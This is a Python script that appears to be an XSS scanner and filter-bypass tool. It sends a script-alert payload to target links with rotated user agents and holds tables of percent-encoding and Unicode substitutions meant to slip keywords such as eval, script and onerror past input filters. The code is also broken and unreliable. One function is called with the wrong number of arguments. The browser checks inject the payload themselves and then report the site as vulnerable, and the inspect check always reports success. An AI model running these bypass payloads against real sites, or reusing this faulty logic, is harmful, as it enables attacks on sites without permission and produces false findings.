import requests
import re
import random
from urllib.parse import urljoin
from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.37",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/89.0",
    # ... Add more user agents as needed
]

def detect_xss(link):
    try:
        response = requests.head(link, timeout=5)
        response.raise_for_status()

        if response.status_code != 200:
            print(f"Failed to scan link: {link}")
            return False

        # Check if the site is encoding the payload
        encoded_payload = '"><script>alert(1)</script>"'
        encoded_payload_response = send_request_with_user_agent(link, encoded_payload)

        if encoded_payload_response.status_code == 200 and encoded_payload in encoded_payload_response.text:
            print(f"The site is encoding the payload. Attempting to bypass...")
            return bypass_filter(link, encoded_payload)

        # Manually check using visible browser
        if manually_check_xss_visible(link, encoded_payload):
            print(f"XSS vulnerability found in link: {link} (manually confirmed)")
            return True

        # Manually check using hidden browser
        if manually_check_xss_hidden(link, encoded_payload):
            print(f"XSS vulnerability found in link: {link} (manually confirmed - hidden browser)")
            return True

        # Manually check using inspect in the browser
        if manually_check_xss_inspect(link):
            print(f"XSS vulnerability found in link: {link} (manually confirmed - inspect)")
            return True

        # Replace this logic with your actual XSS detection mechanism
        # ...

        return False

    except requests.exceptions.RequestException as e:
        print(f"Error scanning link {link}: {e}")
        return False

def send_request_with_user_agent(link, payload):
    headers = {'User-Agent': random.choice(USER_AGENTS)}
    return requests.get(urljoin(link, payload), headers=headers, timeout=5)

def manually_check_xss_visible(link, payload):
    try:
        # Launch a visible browser
        browser = webdriver.Chrome(executable_path="path/to/chromedriver")

        # Navigate to the link and inject the payload
        browser.get(link)
        browser.execute_script(f'document.body.innerHTML += "{payload}";')

        # Wait for a specific element with the injected payload to appear
        element_present = WebDriverWait(browser, 10).until(
            EC.presence_of_element_located((By.XPATH, f'//*[contains(text(), "{payload}")]'))
        )

        return True

    except Exception as e:
        print(f"Error during manual check for link {link} (visible): {e}")
        return False

    finally:
        browser.quit()

def manually_check_xss_hidden(link, payload):
    try:
        # Launch a hidden browser
        options = webdriver.ChromeOptions()
        options.add_argument("--headless")
        browser = webdriver.Chrome(executable_path="path/to/chromedriver", options=options)

        # Navigate to the link and inject the payload
        browser.get(link)
        browser.execute_script(f'document.body.innerHTML += "{payload}";')

        # Wait for a specific element with the injected payload to appear
        element_present = WebDriverWait(browser, 10).until(
            EC.presence_of_element_located((By.XPATH, f'//*[contains(text(), "{payload}")]'))
        )

        return True

    except Exception as e:
        print(f"Error during manual check for link {link} (hidden): {e}")
        return False

    finally:
        browser.quit()

def manually_check_xss_inspect(link):
    try:
        # Launch a visible browser
        browser = webdriver.Chrome(executable_path="path/to/chromedriver")

        # Allow user to inspect the page manually
        input("Please inspect the page for XSS vulnerability using browser's inspect tool. Press Enter when done.")

        return True

    except Exception as e:
        print(f"Error during manual check for link {link} (inspect): {e}")
        return False

    finally:
        browser.quit()

def bypass_filter(link, encoded_payload_response, original_payload):
    try:
        # Check if the payload is encoded
        if '%' in original_payload:
            print("Payload is encoded. Attempting to detect encoding...")

            # Analyze the response to identify encoding patterns
            encoding_patterns = re.findall(r'&lt;|&gt;|&#x3e;|&#x3c;|&lt;|&gt;|&#x3e;|&#x3c;', encoded_payload_response.text)

            if encoding_patterns:
                print(f"Detected encoding patterns: {set(encoding_patterns)}")

                # Generate a new payload based on encoding patterns
                new_payload = generate_auto_payload(original_payload, encoding_patterns)
                print(f"Generated new payload: {new_payload}")

                # Attempt to send the new payload
                new_payload_response = send_request_with_user_agent(link, new_payload)

                if new_payload_response.status_code == 200 and original_payload in new_payload_response.text:
                    print(f"Re-encoding successful! XSS vulnerability found in link: {link}")
                    return True
                else:
                    print("Re-encoding failed.")

            # Additional bypass techniques for complex filters
            complex_bypass_techniques = {
                'eval': 'e%76al',  # Example: eval => e%76al
                'expression': 'e%78pression',  # Example: expression => e%78pression
                'javascript': 'j%61vascript',  # Example: javascript => j%61vascript
                'alert': 'al%65rt',  # Example: alert => al%65rt
                'onerror': 'on%65rror',  # Example: onerror => on%65rror
                'script': 'scr%69pt',  # Example: script => scr%69pt
                'function': 'f%75nction',  # Example: function => f%75nction
                'document': 'docum%65nt',  # Example: document => docum%65nt
                'prompt': 'pro%6dpt',  # Example: prompt => pro%6dpt
                'window': 'win%64ow',  # Example: window => win%64ow
                # Additional advanced techniques
                'constructor': 'constru%63tor',  # Example: constructor => constru%63tor
                'fromCharCode': 'fromCharC%6fde',  # Example: fromCharCode => fromCharC%6fde
                'String.fromCharCode': 'String.f%72omCharCode',  # Example: String.fromCharCode => String.f%72omCharCode
                'unescape': 'un%65scape',  # Example: unescape => un%65scape
                'setTimeout': 'setTimeo%75t',  # Example: setTimeout => setTimeo%75t
                'setInterval': 'setInterva%6c',  # Example: setInterval => setInterva%6c
                'Function': 'Fu%6ectio%6e',  # Example: Function => Fu%6ectio%6e
                # Add more advanced techniques as needed
            }

            for keyword, technique in complex_bypass_techniques.items():
                if keyword in original_payload:
                    new_payload = original_payload.replace(keyword, technique)
                    print(f"Applied complex bypass technique: {new_payload}")

                    # Attempt to send the new payload
                    new_payload_response = send_request_with_user_agent(link, new_payload)

                    if new_payload_response.status_code == 200 and original_payload in new_payload_response.text:
                        print(f"Complex bypass successful! XSS vulnerability found in link: {link}")
                        return True
                    else:
                        print("Complex bypass failed.")

    except Exception as e:
        print(f"An error occurred: {e}")

    return False


def generate_auto_payload(original_payload, encoding_patterns):
    # Generate a new payload based on encoding patterns
    new_payload = original_payload

    # Mapping of additional encoding patterns
    additional_encoding_patterns = {
        "'": '&#x27;',
        '/': '&#x2F;',
        '(': '&#x28;',
        ')': '&#x29;',
        '"': '&#x22;',
        '-': '&#x2D;',
        'Ù«': '&#x66B;',
        # Add more patterns as needed
    }

    # Additional bypass techniques
    bypass_techniques = {
        '-': ['%u2212', '-%0a', '-%0b', '-%0c', '-%0d', '-%09', '-%0e', '-%0f', '-%a0'],
        '(': ['[]', '{}', '<>'],
        '/': ['%2f', '\/', '\|'],
        ';': ['(;)'],
        '\'': ['\\\'', '&#x27;'],
        '\"': ['\\"', '&#x22;'],
        '<': ['%3C', '&lt;'],
        '>': ['%3E', '&gt;'],
        # Add more techniques as needed
    }

    # Additional encoding techniques
    additional_encoding_techniques = {
        '-': ['%u002d', '%u002d%u002d', '%u2212', '%u2013', '%u2014'],
        '(': ['%u0028', '%u0029', '%u003c', '%u003e', '%u005b', '%u005d', '%u007b', '%u007d'],
        '/': ['%u002f', '%u2215', '%u29f8', '%u2216', '%u2f', '%u5c'],
        ';': ['%u003b', '%uff1b', '%u037e', '%u061b', '%u1803', '%u204f', '%u3001'],
        '\'': ['%u0027', '%u2018', '%u2019', '%u02b9', '%u02bc', '%u055a', '%u05f3', '%u0060'],
        '\"': ['%u0022', '%u201c', '%u201d', '%u00ab', '%u00bb'],
        '<': ['%u003c', '%uff1c', '%u02c2', '%u02c3', '%u2039', '%u203a'],
        '>': ['%u003e', '%uff1e', '%u02c6', '%u02c7', '%u02c9', '%u2038', '%u203b'],
        # Add more techniques as needed
    }


    # Replace encoding patterns with the appropriate encoding
    for pattern in set(encoding_patterns):
        if pattern in additional_encoding_patterns:
            new_payload = new_payload.replace(pattern, additional_encoding_patterns[pattern])

    # Apply additional bypass techniques
    for char, techniques in bypass_techniques.items():
        if char in new_payload:
            for technique in techniques:
                new_payload = new_payload.replace(char, technique)

    # Apply additional encoding techniques
    for char, techniques in additional_encoding_techniques.items():
        if char in new_payload:
            for technique in techniques:
                new_payload = new_payload.replace(char, technique)

    return new_payload


